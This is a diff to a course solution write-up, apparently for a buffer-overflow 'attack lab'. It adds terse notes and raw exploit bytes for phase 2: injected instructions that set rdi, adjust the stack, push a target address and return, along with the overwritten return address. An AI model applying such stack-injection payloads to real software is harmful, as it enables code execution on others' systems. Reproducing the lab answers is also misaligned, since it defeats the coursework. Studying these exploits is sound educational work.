@@ -33,3 +33,32 @@ handout.
 # Solution
 ### Phase 1:
 - filling 0x18 bytes to override the return address of stack, add a few padding
+
+### Phase 2:
+
+bf aa 73 fa 50 // bf = set value to rdi
+48 83 ec 08 // sub $0x8,%rsp
+48 c7 44 24 00 02 17 40 00  // movq   $0x00401702,0x0(%rsp)
+c3 00 00 // ret
+11 11 11 11
+11 11 11 11
+88 74 61 55 // address of first ins below
+
+
+
+ret -> to next first of instruction in the stack as string
+88 74 61 55 // address of first ins below
+
+mov $50fa73aa, $rdi
+bf aa 73 fa 50 // bf = set value to rdi
+
+rsp grow down to put phase two as the old position
+48 83 ec 08 // sub $0x8,%rsp
+
+put phase address to stack
+02 17 40 00
+48 c7 44 24 00 02 17 40 00 
+48 c7 44 24 08 20 45 60 00	movq   $0x604520,0x8(%rsp)
+
+ret
+c3
